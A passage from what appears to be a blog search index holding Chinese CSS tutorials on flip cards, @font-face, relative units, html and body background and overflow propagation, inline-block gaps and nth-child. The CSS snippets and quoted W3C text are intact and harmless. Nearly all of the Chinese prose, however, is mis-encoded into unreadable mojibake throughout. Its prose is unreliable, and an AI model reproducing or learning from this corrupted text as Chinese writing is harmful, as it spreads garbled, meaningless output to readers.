ä¾†éè£œ .front è®“å‡ºä¾†çš„ç©ºé–“ã€‚ ä¹Ÿå°±æ˜¯èªªé€™å€‹æ™‚å€™çš„ .front å…¶å¯¦æ˜¯ç–Šåœ¨ .back èº«ä¸Šçš„ï¼Œåªæ˜¯å› ç‚ºåˆåŠ äº† rotateY(90deg) æ‰æ¶ˆå¤±çš„ã€‚ æ€éº¼åšåˆ°çš„ï¼Ÿä¾†çœ‹ä¸‹é¢é€™å¼µåœ–æ‡‰è©²å°±ç†è§£äº†ï¼š ç”¨ä¸‰ç¶­ç©ºé–“çš„è§’åº¦ä¾†æ€è€ƒ X è»¸è·Ÿ Y è»¸æ‡‰è©²å°±èƒ½ç†è§£äº†ã€‚ ç¸½ä¹‹åšåˆ°é€™é‚Šå¾Œï¼Œå…¶å¯¦å°±å·®ä¸å¤šå®Œæˆäº†ã€‚å‰©ä¸‹çš„åªæ˜¯åŠ ä¸Šä¸€ä¸‹ transition çš„æ•ˆæœè€Œå·²ï¼š 1234567891011121314151617181920.card .front { position: absolute; transform: rotateY(90deg); background: #2aac9e; transition: transform 0.2s;}.card .back { background: #6351c3; transform: rotateY(0deg); transition: transform 0.2s; transition-delay: 0.2s;}.card:hover .front { transform: rotateY(0deg); transition-delay: 0.2s;}.card:hover .back { transform: rotateY(90deg); transition-delay: 0s;} é€™é‚Šæœƒçœ‹ä¸å¤ªæ‡‚çš„åœ°æ–¹æ‡‰è©²æ˜¯ delay çš„éƒ¨åˆ†ã€‚ç°¡å–®ä¾†èªªï¼Œé€™æ¨£å¯«çš„ç”¨æ„æ˜¯å¸Œæœ›åœ¨ hover çš„æ™‚å€™ï¼š .front ç­‰ 0.2s å¾Œå†ç§€å‡ºä¾† .back ç­‰ 0s å¾Œå°±è—èµ·ä¾† ç¸½è€Œè¨€ä¹‹å»¶é²çš„ç›®çš„æ˜¯è®“å‹•ç•«çœ‹èµ·ä¾†æ²’æœ‰è¡çªï¼Œé€™å°±æ˜¯ delay çš„ç”¨æ„ã€‚ å¦‚æœé‚„æ˜¯ä¸å¤ªæ‡‚çš„è©±ï¼Œå»ºè­°å…ˆå»é‡æº«ä¸€ä¸‹ delay æ˜¯æ€éº¼é‹ä½œçš„ï¼Œä¹‹å¾Œå†å›ä¾†çœ‹æ‡‰è©²å°±æ‡‚äº†ã€‚ æƒ³å¯¦éš›ç©ç©çœ‹çš„è©±å¯ä»¥åˆ° é€™é‚Š åƒè€ƒã€‚","link":"/2022/06/27/css-flip-card/"},{"title":"CSSï¼ä½¿ç”¨ font-face ä¾†è¨­å®šå­—å‹çš„æ–¹æ³•","text":"é›–ç„¶ CDN å¾ˆæ–¹ä¾¿ï¼Œä½†æœ‰æ™‚å€™æ˜¯å¾—ç”¨åˆ°é€™ç¨®æ–¹å¼æ¯”è¼ƒç©©å®šã€‚ ç°¡è¿°ä¸€èˆ¬å¸¸ç”¨çš„æ˜¯ url çš„æ–¹å¼ï¼š 1@import url('https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200;0,300;0,400;&amp;display=swap'); ä½†æœ‰äº›æ™‚å€™å¯èƒ½ä¸æƒ³é€éé€™ç¨® url çš„æ–¹å¼ä¾†è™•ç†ï¼Œé€™æ™‚å°±å¯ä»¥æ”¹ç”¨ @font-face çš„æ–¹å¼ä¾†æ”¹å¯«ï¼š 123456789101112131415161718192021222324@font-face { font-family: 'Nunito'; font-weight: 200; font-style: normal; src: url('../public/font/Nunito-ExtraLight.ttf') format('truetype');}@font-face { font-family: 'Nunito'; font-weight: 200; font-style: italic; src: url('../public/font/Nunito-ExtraLightItalic.ttf') format('truetype');}@font-face { font-family: 'Nunito'; font-weight: 300; font-style: normal; src: url('../public/font/Nunito-Light.ttf') format('truetype');}@font-face { font-family: 'Nunito'; font-weight: 300; font-style: italic; src: url('../public/font/Nunito-LightItalic.ttf') format('truetype');} é€™é‚Šç°¡å–®ä¾†èªªå°±æ˜¯åœ¨è¨­å®šç­‰ä¸€ä¸‹è¦æ€éº¼ç”¨å®ƒï¼Œæ‘˜è¦å¹¾å€‹é‡é»ï¼š font-family å¯ä»¥å¹«é€™å€‹å­—å‹å–åç¨±ï¼ˆå¦‚æœä½ ä¸æƒ³ç”¨åŸä¾†çš„åå­—ï¼‰ font-weight è©²å­—å‹çš„å¯¬åº¦æ•¸å€¼ font-style å“ªä¸€ç¨®æ¨£å¼ï¼Œä¾‹å¦‚ï¼šnormal æˆ– italic src æª”æ¡ˆçš„ä½ç½®ï¼Œå¯ä»¥æ˜¯å°ˆæ¡ˆè³‡æ–™å¤¾ï¼Œä¹Ÿå¯ä»¥æ˜¯ url format è©²å­—å‹çš„æ ¼å¼ å‰¯æª”å format .woff \"woff\" .ttf \"truetype\" .ttf æˆ– .otf \"opentype\" .eto \"embedded-opentype\" .svg æˆ– .svgz \"svg\" å¦‚æœæƒ³çŸ¥é“æ›´å¤šç´°ç¯€ï¼Œæ¨è–¦åƒè€ƒé€™ç¯‡ã€‚","link":"/2022/06/25/css-font-face/"},{"title":"CSS ä¹‹ä»€éº¼æ™‚å€™è©²è¨­å®šæˆç›¸å°å–®ä½","text":"å¯« RWD æœ€é›£æçš„å°±æ˜¯å–®ä½äº†ã€‚ å€‹äººå»ºè­°æˆ‘è¦ºå¾—æ–°æ‰‹åœ¨å° RWD ä¸å¤ªç†Ÿçš„æ™‚å€™å¸¸æœƒåˆ†ä¸æ¸…æ¥šä»€éº¼æ™‚å€™è©²ä½¿ç”¨ã€Œç›¸å°å–®ä½ã€ï¼Œä»€éº¼æ™‚å€™è©²ç”¨ã€Œçµ•å°å–®ä½ã€ï¼Œæ‰€ä»¥ä»¥ä¸‹æ˜¯æˆ‘çš„ä¸€äº›å»ºè­°ï¼š æœƒéš¨è‘—å¯¬åº¦ä¾†åšæ”¹è®Šçš„å€å¡Šï¼Œæ‡‰è©²è¦å°‡å…¶ width è¨­ç‚º % æ–‡å­—æˆ–å€å¡Šä¹‹é–“çš„ marginï¼Œpadding å‰‡è¦è¦–æƒ…æ³ï¼Œå¦‚æœè¨­ç‚º %ï¼Œå‰‡ç•¶å¯¬åº¦è¶Šå¤§çš„æ™‚å€™ï¼Œæ–‡å­—æˆ–å€å¡Šä¹‹é–“çš„é–“è·ä¹Ÿæœƒè·Ÿè‘—é€æ¼¸è®Šå¤§ï¼Œæ‰€ä»¥é€™éƒ¨åˆ†è¦è‡ªå·±æ–Ÿé…Œã€‚ æœ‰äº›å€å¡Šçš„ paddingã€‚å¦‚æœå››å€‹é‚Šéƒ½æœ‰è¨­ paddingï¼Œé‚£å°±è¦è€ƒæ…®åˆ°ï¼Œç•¶å¯¬åº¦è¶Šå¯¬çš„æ™‚å€™ï¼Œé€™å€‹å€å¡Šçš„å…§å®¹å°±æœƒè¶Šå¾€è£¡é¢æ¨ï¼Œæ‰€ä»¥è¦è€ƒæ…®å…§å®¹æœ¬èº«æœƒä¸æœƒéš¨è‘—å¯¬åº¦å¢åŠ è€Œè®Šå¤§ï¼Ÿå¦‚æœä¸æœƒï¼Œé‚£å·®è·å°±éš¨è‘—å¯¬åº¦æœƒè¶Šä¾†è¶Šå¤§ã€‚ å¦‚æœå¸Œæœ›ä¸€å€‹å€å¡Šçš„width heightæœƒéš¨è‘—è¦–çª—å¢åŠ çš„æ™‚å€™ï¼Œæˆ–è¨±å°±éœ€è¦è¨­ %ã€‚","link":"/2022/01/16/css-good-time-to-use-percentage-unit/"},{"title":"CSS ä¸­ html èˆ‡ body çš„å‘ä¸Šå‚³éè¡Œç‚º","text":"ä»¥å‰å¯«çš„å¥½æ·±å¥§ã€‚ ç‚ºä»€éº¼è¦è¨è«–é€™å€‹æ±è¥¿ï¼Ÿè®“æˆ‘å…ˆå•å•çœ‹ï¼Œä½ æœ‰æ²’æœ‰æ›¾ç¶“ç¢°éä»¥ä¸‹çš„å•é¡Œï¼Œä½†å»ä¸çŸ¥é“ç‚ºä»€éº¼æœƒé€™æ¨£ï¼Ÿ ç‚ºä»€éº¼ &lt;body&gt; çš„é«˜åº¦ä¸ç®¡æ˜¯å¤šå°‘ï¼Œå®ƒçš„ background-color éƒ½æœƒå¥—ç”¨åˆ°æ•´å€‹ç•«é¢ï¼Ÿ ç‚ºä»€éº¼ overflow çš„é è¨­å€¼æ˜æ˜æ˜¯ visibleï¼Œä½†ç•¶å…§å®¹è¶…å‡º &lt;body&gt; æ™‚ï¼Œä»æœƒç”¢ç”Ÿæ»¾è»¸ï¼Ÿ é€™æ˜¯å› ç‚ºæœ‰å€‹å« ã€ŒPropagating behaviorï¼ˆå‚³éè¡Œç‚ºï¼‰ã€ çš„æ©Ÿåˆ¶ï¼Œé€™å€‹è¡Œç‚ºåªæœƒç™¼ç”Ÿåœ¨ &lt;body&gt; è·Ÿ &lt;html&gt;é€™å…©å€‹å…ƒç´ ä¸Šã€‚ ç¶²é æœ€åº•å±¤çš„èƒŒæ™¯é¡è‰² Canvasä¸€å€‹ç¶²é ä¸­é™¤äº†æˆ‘å€‘çœ‹åˆ°çš„ç•«é¢ä¹‹å¤–ï¼Œå®ƒçš„æœ€åº•å±¤å…¶å¯¦æ˜¯ä¸€å€‹ã€ŒCanvas(ç•«å¸ƒ)ã€ã€‚ Canvas æ˜¯ä¸€å€‹ä½”æ“šæ•´å€‹ç¶²é ç•«é¢çš„ä¸€å¼µç´™ï¼Œæˆ‘å€‘ç¶²é ä¸­æ‰€æœ‰çš„å…§å®¹ã€æ¨£å¼è¨­å®šï¼Œéƒ½æ˜¯æ”¾åœ¨é€™å¼µç•«å¸ƒä¸Šé¢ä¾†å‘ˆç¾çš„ã€‚ é—œæ–¼ Canvasï¼ŒW3C çš„è¦ç¯„ä¸­æåˆ°äº†é€™ä¸€æ®µï¼š Since no element corresponds to the canvas, in order to allow styling of the canvas CSS propagates the background of the root element (or, in the case of HTML, the &lt;body&gt; element). å¤§æ„æ˜¯æŒ‡ï¼š æ—¢ç„¶ç¶²é ä¸Šæ²’æœ‰ä¸€å€‹èƒ½å¤ ä»£è¡¨ Canvas çš„å…ƒç´ ä¾†è®“æˆ‘å€‘ç›´æ¥è¨­å®šï¼Œé‚£å°±è®“ CSS è—‰ç”±å‚³éæ ¹å…ƒç´ ï¼ˆhtmlï¼‰æˆ–æ˜¯ &lt;body&gt; çš„èƒŒæ™¯è‰²ï¼Œä¾†å° Canvas åšè¨­å®šã€‚ ä¹Ÿå°±æ˜¯èªªï¼Œæˆ‘å€‘å¯¦éš›ä¸Šéƒ½æ˜¯é€éæ ¹å…ƒç´ ä¾†è¨­å®š Canvas çš„èƒŒæ™¯è‰²ï¼Œåƒé€™æ¨£ï¼š 1234567html { // èƒŒæ™¯è‰²æœƒè¢«å‚³éåˆ°Canvas background-color: #ffa; // å°±ç®—è¨­å®šäº†é«˜åº¦ï¼ŒèƒŒæ™¯è‰²ä»é¡¯ç¤ºå…¨å±ï¼Œ // å› ç‚º Canvas çš„ç¯„åœæ˜¯æ•´å€‹é é¢ height: 100px;} å¦‚æœè¦ºå¾—æœ‰é»æŠ½è±¡çš„è©±ï¼Œä½ ä¹Ÿå¯ä»¥æƒ³åƒæˆæ˜¯é€™æ¨£å­ï¼š 123456Canvas { background-color: #ffa;}html { height: 100px;} æ‰€ä»¥ç¶²é æœ€åº•å±¤çš„èƒŒæ™¯è‰²æ˜¯ç”± Canvas ä¾†æ±ºå®šçš„ï¼Œ&lt;html&gt; åªæ˜¯è² è²¬æŠŠèƒŒæ™¯é¡è‰²å‚³éçµ¦ Canvas è€Œå·²ã€‚ Codepenï¼š See the Pen html-background-color by jim (@jubeatt) on CodePen. ä¸éè¦ç¯„ä¸­ä¼¼ä¹æœ‰æåˆ° &lt;body&gt; ä¹Ÿèƒ½å¤ å‚³éèƒŒæ™¯è‰²çµ¦ Canvasï¼Œé€™åˆæ˜¯æ€éº¼ä¸€å›äº‹å‘¢ï¼Ÿ æˆ‘å€‘å†ä¾†çœ‹å€‹ä¾‹å­ï¼š ç¾åœ¨æˆ‘å€‘ä¸å° &lt;html&gt; åšèƒŒæ™¯è‰²çš„è¨­å®šï¼Œè€Œæ˜¯å° &lt;body&gt; è¨­å®šèƒŒæ™¯è‰²ï¼Œçœ‹çœ‹æœƒç™¼ç”Ÿä»€éº¼ï¼š 123body { background-color: #ffa;} See the Pen body-background-color / When html doesn't have a backgroundColor. by jim (@jubeatt) on CodePen. Wowï¼Œå°±å’Œ &lt;html&gt; ä¸€æ¨£ï¼Œ&lt;body&gt; æŠŠèƒŒæ™¯è‰²çµ¦å‚³éçµ¦ Canvas äº†ï¼ å…¶å¯¦é€™å€‹èªªæ³•åªå°äº†ä¸€åŠï¼Œå¯¦éš›ä¸Šæ˜¯é€™æ¨£å­ï¼š &lt;body&gt; å…ˆæŠŠèƒŒæ™¯è‰²å‚³çµ¦ &lt;html&gt; &lt;html&gt; å†æŠŠèƒŒæ™¯è‰²å‚³çµ¦ Canvas é€™å€‹éƒ¨åˆ†æˆ‘å€‘å†ä¾†çœ‹ä¸€æ®µ W3C çš„è¦ç¯„èªªæ˜ï¼š For documents whose root element is an HTML HTML element [HTML401] or an XHTML html element [XHTML11]: if the computed value of â€˜background-imageâ€™ on the root element is â€˜noneâ€™ and its â€˜background-colorâ€™ is â€˜transparentâ€™, user agents must instead propagate the computed values of the background properties from that elementâ€™s first HTML BODY or XHTML body child element. The used values of that BODY elementâ€™s background properties are their initial values, and the propagated values are treated as if they were specified on the root element. It is recommended that authors of HTML documents specify the canvas background for the BODY element rather than the HTML element. å¤§æ„æ˜¯æŒ‡ï¼š åœ¨è¦ç¯„ä¸­æ ¹å…ƒç´ ç‚º &lt;html&gt; çš„æ–‡ä»¶æª”æ¡ˆï¼ˆHTML æˆ– XHTMLï¼‰ï¼Œå¦‚æœæ ¹å…ƒç´  â€œbackground-imageâ€ çš„å€¼ç‚º â€œnoneâ€ ä¸” â€œbackground-colorâ€ çš„å€¼ç‚º â€œtransparentâ€ï¼Œå‰‡ user agents å¿…é ˆä»¥æ ¹å…ƒç´ ä¸­çš„ &lt;body&gt; ä¾†å‚³é background è¨­å®šçµ¦ Canvasã€‚çœ‹èµ·ä¾†å°±è·ŸæŒ‡å®šå€¼çµ¦æ ¹å…ƒç´ å¾ˆé¡ä¼¼ï¼Œä½†é€™åªæ˜¯ä¸€å€‹éŒ¯è¦ºï¼Œå¯¦éš›ä¸Šé€™å€‹å€¼æ˜¯å¾ &lt;body&gt; å‚³ééå»çš„ã€‚ å¦å¤–ï¼Œè¦ç¯„ä¸­å»ºè­°ä»¥ &lt;body&gt; ä¾†è¨­ç½® Canvas çš„èƒŒæ™¯æ¨£å¼ï¼Œä¸è¦ç”¨ &lt;html&gt;ã€‚ ğŸ’¡ è¨»ï¼šuser agents æŒ‡çš„æ˜¯ç€è¦½å™¨çš„é è¨­æ¨£å¼ï¼Œåœ¨ W3C è¦ç¯„ä¸­æœ‰æ™‚æœƒç¸®å¯«æˆ UAs è©³ç´°çš„æµç¨‹å¯ä»¥æ•´ç†æˆé€™æ¨£ï¼š html åªè¦æœ‰è¨­å®šèƒŒæ™¯è‰² â†’ ä¸€å¾‹å°‡htmlçš„èƒŒæ™¯è‰²å‚³éåˆ° Cavasã€‚ html æ²’æœ‰è¨­å®šèƒŒæ™¯è‰² &amp; body æœ‰è¨­ç½®èƒŒæ™¯è‰² â†’ å°‡èƒŒæ™¯è‰²å‚³éçµ¦ html â†’ å†å‚³éåˆ° Cavasã€‚ html æ²’æœ‰è¨­å®šèƒŒæ™¯è‰² &amp; body æ²’æœ‰è¨­ç½®èƒŒæ™¯è‰² â†’ Cavas é è¨­å‘ˆç¾ç™½è‰²ã€‚ çœ‹çš„æœ‰é»äº‚å§ï¼Œè®“æˆ‘å€‘è¬›ç™½è©±ä¸€é»ï¼š åªè¦æ²’æœ‰è¨­å®š &lt;html&gt; çš„ background-image è·Ÿ background-colorï¼Œé‚£å°±ä¸€å¾‹æ¡ç”¨ &lt;body&gt; çš„è¨­å®šã€‚ é—œæ–¼ç¶²é ä¸­çš„æ»¾è»¸æ¥è‘—ä¾†è¨è«–ç¬¬äºŒå€‹å•é¡Œï¼šç‚ºä»€éº¼å…§å®¹è¶…å‡º &lt;body&gt; æ™‚ï¼Œä»æœƒç”¢ç”Ÿæ»¾è»¸ï¼Ÿ See the Pen html&amp;body-scrollbar by jim (@jubeatt) on CodePen. ç…§ç†ä¾†èªªï¼Œæ¯å€‹å…ƒç´ çš„ overflow é è¨­å€¼éƒ½æ˜¯ visibleï¼Œæ€éº¼é‚„æœƒç”¢ç”Ÿæ»¾è»¸ï¼Ÿ å…¶å¯¦é€™å€‹é“ç†è·Ÿå‰›å‰›èƒŒæ™¯è‰²çš„å‚³éè¡Œç‚ºä¸€æ¨£ï¼Œè®“æˆ‘å€‘å†ä¾†çœ‹ä¸€æ®µè¦ç¯„ï¼š UAs must apply the overflow-_ values set on the root element to the viewport. However, when the root element is an [HTML] html element (including XML syntax for HTML) whose overflow value is visible (in both axes), and that element has a body element as a child, user agents must instead apply the overflow-_ values of the first such child element to the viewport. The element from which the value is propagated must then have a used overflow value of visible. å¤§æ„æ˜¯æŒ‡ï¼š ç€è¦½å™¨å¿…é ˆå¥—ç”¨æ ¹å…ƒç´  &lt;html&gt; çš„ overflow å€¼å‚³éçµ¦ viewportï¼ˆè¦–çª—ï¼‰ï¼Œä½†å¦‚æœæ ¹å…ƒç´  &lt;html&gt; çš„ overflow å€¼ç‚º visibleï¼Œå‰‡ç€è¦½å™¨å¿…é ˆä»¥ &lt;body&gt; çš„ overflow å€¼å‚³éçµ¦ viewportï¼ˆè¦–çª—ï¼‰ã€‚ ğŸ’¡ è¨»ï¼šuser agents æŒ‡çš„æ˜¯ç€è¦½å™¨çš„é è¨­æ¨£å¼ï¼Œåœ¨ W3C è¦ç¯„ä¸­æœ‰æ™‚æœƒç¸®å¯«æˆ UAs æ‰€ä»¥åœ¨è¦ç¯„ä¸­æˆ‘å€‘å¯ä»¥å…ˆé‡æ¸…å…©ä»¶äº‹æƒ…ï¼š ç€è¦½å™¨ç”¢ç”Ÿçš„æ»¾è»¸æ˜¯ç”± viewportï¼ˆè¦–çª—ï¼‰ ä¾†æ§åˆ¶çš„ï¼Œä¸æ˜¯ &lt;html&gt; æˆ– &lt;body&gt;ã€‚ viewport æœ¬èº«ç„¡æ³•è¨­å®š overflow ï¼Œå¿…é ˆè—‰ç”± &lt;html&gt; æˆ– &lt;body&gt;ä¾†å‚³éã€‚ å†æŠŠè¦ç¯„ä¸­çš„å…§å®¹æ•´ç†ä¸€ä¸‹ï¼š &lt;html&gt; è¨­å®š visible ä»¥å¤–çš„å€¼æ™‚ï¼Œä¸€å¾‹å°‡é€™å€‹å€¼å‚³çµ¦ viewportã€‚ &lt;html&gt; è¨­å®š visible æ™‚ï¼Œå…ˆå°‡&lt;body&gt;çš„ overflow å€¼å‚³çµ¦&lt;html&gt;ï¼Œå†å‚³éçµ¦ viewportã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œè¦ç¯„ä¸­é‚„æåˆ°äº†é€™ä¸€æ®µï¼š If visible is applied to the viewport, it must be interpreted as auto. If clip is applied to the viewport, it must be interpreted as hidden. æ„æ€æ˜¯æŒ‡ï¼š å¦‚æœ viewport å¥—ç”¨çš„ overflow å€¼ç‚º visibleï¼Œå‰‡æœƒè¢«è§£è­¯ç‚º autoã€‚ å¦‚æœ viewport å¥—ç”¨çš„ overflow å€¼ç‚º clipï¼Œå‰‡æœƒè¢«è§£è­¯ç‚º hiddenã€‚ æ‰€ä»¥è®“æˆ‘å€‘ä¾†çœ‹çœ‹ï¼Œåœ¨é è¨­å€¼çš„æƒ…æ³ä¸‹ï¼Œæ»¾è»¸æ˜¯æ€éº¼ç”¢ç”Ÿçš„ã€‚ 1234html { // é è¨­å€¼ overflow: visible;} &lt;html&gt; çš„å€¼ç‚º visibleï¼Œæ‰€ä»¥åƒè€ƒ &lt;body&gt; çš„ overflowã€‚ 1234body { // é è¨­å€¼ overflow: visible;} viewport æœ€å¾Œå¾—åˆ°çš„å€¼ã€‚ 123Viewport { overflow: visible;} viewport ç¶“éè§£è­¯å¾Œçš„å€¼ã€‚ 123Viewport { overflow: auto;} é€™å°±æ˜¯ç‚ºä»€éº¼ï¼Œå³ä¾¿ä½ æ˜æ˜æ²’æœ‰åšä»»ä½•è¨­å®šï¼Œåœ¨é è¨­å€¼ overflow: visible çš„æƒ…æ³ä¸‹ï¼Œå»é‚„æ˜¯èƒ½å¤ ç”¢ç”Ÿå‡ºæ»¾è»¸çš„åŸå› ã€‚","link":"/2022/01/16/css-html-and-body-propagating-behavior/"},{"title":"CSS ä¹‹ <html> èˆ‡ <body> çš„å¯¬é«˜","text":"ä»¥å‰å¸¸ææ··çš„è§€å¿µã€‚ ç°¡è¿°å¦‚æœå° &lt;html&gt; è·Ÿ &lt;body&gt; çš„å¯¬é«˜è¨­å®šã€Œç›¸å°å–®ä½ã€æ™‚ï¼Œè¦ç‰¹åˆ¥æ³¨æ„å®ƒå€‘çš„åƒè€ƒå°è±¡æ˜¯èª°ï¼š &lt;html&gt; åƒè€ƒåˆ°è¦–çª—ï¼ˆviewportï¼‰ &lt;body&gt; åƒè€ƒåˆ° &lt;html&gt; åªè¦ææ¸…æ¥šåƒè€ƒå°è±¡ï¼Œå°±ä¸æœƒææ··ä¸€äº›æ±è¥¿ã€‚ æˆ‘ä»¥å‰æ²’å¼„æ‡‚çš„äº‹ä¸çŸ¥é“ä½ å€‘æœƒä¸æœƒè·Ÿæˆ‘ä¸€æ¨£ï¼Œä»¥å‰ç¶“å¸¸çœ‹ä¸æ‡‚é€™æ®µåŸå§‹ç¢¼çš„æ„æ€ï¼š 1234html,body { height: 100%;} é€™æ®µåŸå§‹ç¢¼é€šå¸¸æ˜¯ç”¨ä¾†è®“æˆ‘å€‘åšå‡ºä¸€å€‹è·Ÿè¦–çª—ä¸€æ¨£é«˜çš„å…¨å±ç•«é¢ï¼Œä½†ä¸€ç›´ä»¥ä¾†è®“æˆ‘æƒ³ä¸é€šçš„å•é¡Œæ˜¯ï¼šç‚ºä»€éº¼ä¸ç›´æ¥è¨­å®š body: 100% å°±å¥½ï¼Œé‚„è¦åŠ å€‹ html ï¼Ÿ ä¸éåœ¨ç†è§£ç›¸å°å–®ä½çš„åƒè€ƒå°è±¡å¾Œï¼Œæˆ‘å°±èƒ½è§£é‡‹é‚£æ®µåŸå§‹ç¢¼çš„æ„æ€äº†ï¼š 12345678// html è¨­å®šé«˜åº¦ 100%ï¼Œä»£è¡¨èˆ‡è¦–çª—çš„é«˜åº¦ x 100%ã€‚html { height: 100%;}// body è¨­å®šé«˜åº¦ 100%ï¼Œä»£è¡¨ html çš„é«˜åº¦ x 100%ã€‚body { height: 100%;} æ‰€ä»¥å¦‚æœæˆ‘å€‘åªæœ‰å¯« body: 100%ï¼Œå°±æœƒè®Šæˆé€™æ¨£ï¼š 12345// body è¨­å®šé«˜åº¦ 100%ï¼Œä»£è¡¨èˆ‡htmlçš„é«˜åº¦ x 100%ã€‚// æ€è€ƒçœ‹çœ‹ï¼Œæ­¤æ™‚ html çš„é«˜åº¦æ˜¯ï¼Ÿbody { height: 100%;} åœ¨ html æ²’æœ‰åšä»»ä½•é«˜åº¦çš„è¨­å®šçš„æƒ…æ³ä¸‹ï¼Œå®ƒçš„é«˜åº¦æœƒæ˜¯ 0ï¼Œæ‰€ä»¥ body çš„å¯¦éš›é«˜åº¦æ˜¯ 0 x 100% = 0ï¼Œé€™ä¹Ÿå°±æ˜¯ç‚ºä»€éº¼ä¸€å®šè¦å†åŠ ä¸Šä¸€å€‹ html çš„åŸå› ã€‚ å¾ˆå¤šæ™‚å€™æˆ‘å€‘æœƒæä¸æ¸…æ¥š body èˆ‡ html ä¹‹é–“çš„é—œä¿‚ï¼Œé€™æ˜¯å› ç‚ºæˆ‘å€‘å¾€å¾€æ²’æœ‰ææ¸…æ¥šå®ƒå€‘çš„çˆ¶å…ƒç´ æ˜¯æŒ‡å‘èª°ã€‚ä½†æ˜¯ç•¶ä½ ææ¸…æ¥šå¾Œï¼Œå°±ä¸æœƒå¸¸å¸¸ææ··äº†ã€‚ è¨˜ä½é€™å€‹åŸå‰‡ï¼š html çš„çˆ¶å…ƒç´  â†’ è¦–çª—ï¼Œbody çš„çˆ¶å…ƒç´  â†’ htmlã€‚ æ‰€ä»¥çˆ¾å¾Œä½ æƒ³åšçš„è¨­å®šæœƒç‰½æ¶‰åˆ°çˆ¶å…ƒç´ æ™‚ï¼Œè«‹å‹™å¿…å…ˆææ¸…æ¥šçˆ¶å…ƒç´ åˆ°åº•æŒ‡å‘çš„æ˜¯èª°ã€‚","link":"/2022/01/16/css-html-and-body-width-height/"},{"title":"CSS ä¹‹ inline-block ä¸­çš„é­”æ³•é–“è·","text":"ç›¸ä¿¡ä¸å°‘äººéƒ½è¸©éçš„é›·ã€‚ å‰è¨€é€™æ‡‰è©²å·²ç¶“æ˜¯å€‹è¢«è¬›åˆ°çˆ›çš„æ±è¥¿ï¼Œä½†å¦‚æœæœ‰æ®µæ™‚é–“æ²’ç¢° CSS çš„è©±ï¼Œé‚„çœŸçš„æœƒä¸å°å¿ƒåˆè¸©åˆ°é€™å€‹é›·ï¼Œæ‰€ä»¥é€™è£¡å°±ç•¶ä½œå†è¤‡ç¿’ä¸€éå§ã€‚ å•é¡Œé»ç°¡å–®ä¾†èªªï¼Œä½ å¯èƒ½æƒ³åšé€™å€‹ç•«é¢ï¼š æ‰€ä»¥ä½ å°±å¾ˆç›´è¦ºçš„å¯«äº†ä»¥ä¸‹ï¼š 1234&lt;div class=\"wrap\"&gt; &lt;div class=\"item\"&gt;&lt;/div&gt; &lt;div class=\"item\"&gt;&lt;/div&gt;&lt;/div&gt; 123.item { display: inline-block;} çµæœä½ å»å¾—åˆ°ï¼š å—¯â€¦å…¶å¯¦æ˜¯é€™å‚¢ä¼™åœ¨ä½œæ€ªï¼š ç©ºç™½å­—å…ƒã€æ›è¡Œå­—å…ƒå› ç‚ºæ›è¡Œèˆ‡ç©ºç™½åœ¨ CSS ä¸­éƒ½æœƒè‡ªå‹•è¢«è§£ææˆã€Œä¸€å€‹ç©ºæ ¼ã€ï¼Œæ‰€ä»¥æœƒç”¢ç”Ÿå¤§ç´„ã€Œä¸€å€‹å­—ã€çš„ç©ºé–“ï¼Œå› æ­¤é‚£æ¢ç¸«å°±æ˜¯é€™æ¨£ç”¢ç”Ÿçš„ã€‚ å¦‚ä½•è§£æ±ºè§£æ±ºçš„æ–¹æ³•å¾ˆç°¡å–®ï¼Œä½ æœ‰å…©æ¢è·¯å¯ä»¥èµ°ã€‚ è®“é€™äº›ç©ºç™½å­—å…ƒä¸€é–‹å§‹å°±ä¸å­˜åœ¨ è®“é€™äº›ç©ºç™½å­—å…ƒæ‰€ç”¢ç”Ÿçš„ç©ºé–“å°åˆ°ä½ æ„Ÿè¦ºä¸åˆ°ã€‚ æ‰€ä»¥ä½ å¯ä»¥ï¼š é‡æ–°èª¿æ•´ HTMLï¼Œè®“æ¨™ç±¤ç·Šé»è‘—æ¨™ç±¤ HTML è¨»è§£æ³•ï¼Œç©ºç™½/æ›è¡Œ çš„éƒ¨åˆ†æ”¹æˆ HTML è¨»è§£ çœç•¥ HTML çš„é–‰åˆæ¨™ç±¤ï¼ˆä½†ä¸å»ºè­°é€™æ¨£åšâ€¦ï¼‰ å°å…ƒç´ è¨­å®š margin è² å€¼ï¼ˆmargin-right: -4pxï¼Œå¤§æ¦‚å°±æ˜¯ä¸€å€‹å­—çš„å¤§å°ï¼‰ åœ¨çˆ¶å±¤è¨­å®š font-size: 0ï¼Œä½†è¦æ³¨æ„ ç¹¼æ‰¿å•é¡Œï¼Œå­å±¤çš„æ–‡å­—å¤§å°ä¹Ÿæœƒè¢«è¨­ç‚º 0ã€‚ ä¸è¦ç”¨ inline-blockï¼Œå°±æ˜¯é€™éº¼ç°¡å–®åˆæš´åŠ› è©³ç´°å¯ä»¥åƒè€ƒ é€™è£¡ Codepenï¼š See the Pen inline-blockä¸­çš„é­”æ³•é–“è·-01 by jim (@jubeatt) on CodePen.","link":"/2022/01/16/css-inline-block-problem/"},{"title":"CSS nth-child","text":"ä¸€å®šæœƒç”¨åˆ°çš„é¸å–å™¨ã€‚ ç°¡å–®èªªæ˜ç°¡å–®ä¾†èªªå°±æ˜¯ã€Œé¸åˆ°åŒä¸€éšå±¤ä¸­çš„ç¬¬ n å€‹ã€ï¼Œä¾‹å¦‚èªªé¸å¥‡æ•¸å€‹ï¼š 1234567&lt;div class=\"wrapper\"&gt; &lt;div&gt;row1&lt;/div&gt; &lt;div&gt;row2&lt;/div&gt; &lt;div&gt;row3&lt;/div&gt; &lt;div&gt;row4&lt;/div&gt; &lt;div&gt;row5&lt;/div&gt;&lt;/div&gt; CSSï¼š 123.wrapper div:nth-child(odd) { background-color: red;} çµæœï¼š å¸¸çŠ¯çš„éŒ¯èª¤å‡è¨­æœ‰æ®µ HTML é•·é€™æ¨£ï¼š 123456&lt;div class=\"wrapper\"&gt; &lt;div class=\"bg-red\"&gt;row1&lt;/div&gt; &lt;div&gt;row2&lt;/div&gt; &lt;div class=\"bg-red\"&gt;row3&lt;/div&gt; &lt;div&gt;row4&lt;/div&gt;&lt;div&gt;row5&lt;/div&gt; å¦‚æœä½ æƒ³é¸ç¬¬äºŒå€‹ .bg-redï¼Œä½ å¯èƒ½æœƒé€™æ¨£å¯«ï¼š 123.wrapper .bg-red:nth-child(even) { background-color: red;} ä¹çœ‹ä¹‹ä¸‹æ„æ€å¥½åƒæ˜¯ã€Œé¸ .wrapper ä¸‹é¢å¶æ•¸å€‹ 